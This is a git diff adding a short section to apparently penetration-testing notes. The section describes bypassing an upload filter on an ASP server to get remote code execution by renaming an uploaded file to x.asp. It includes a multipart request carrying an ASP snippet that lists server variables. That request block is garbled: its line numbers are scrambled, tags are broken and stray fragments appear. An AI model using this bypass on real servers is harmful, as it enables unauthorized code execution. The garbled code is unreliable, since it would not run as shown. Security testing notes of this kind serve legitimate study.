@@ -57,3 +57,33 @@ Other files that should be restricted for most applications:
 .hxt -> potential XSS
 .stm -> potential XSS
 ```
+
+- RCE via file upload on asp server. 
+1. Do file upload normally -> send to repeater
+1. Leave the "content type" the same in the post form, but change the filename to x.asp. Use a benign asp function like following:
+1. Send it. If it worked, you bypassed the filter.
+```bash
+58 ---WebKitFor
+59 Content-Disposition: form-data; name="
+50 Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+51
+52 <%
+63 Dim Vars
+54 %>
+55 <TABLE width="75%" BORDER=1 align="center" cellpadding="3" cellspacing="0">
+56 < For Each Vars In Request.ServerVariables %>
+57
+<TR>
+58
+59
+70
+</TR>
+71 <% Next >
+72 </TABLE>
+77
+<TD><%= Vars %></TD>
+<TD><%= Request. ServerVariables (Vars) >&nbsp;</TD>
+Walki+r.
+--Veiku T...
+filename="x.asp"
+```
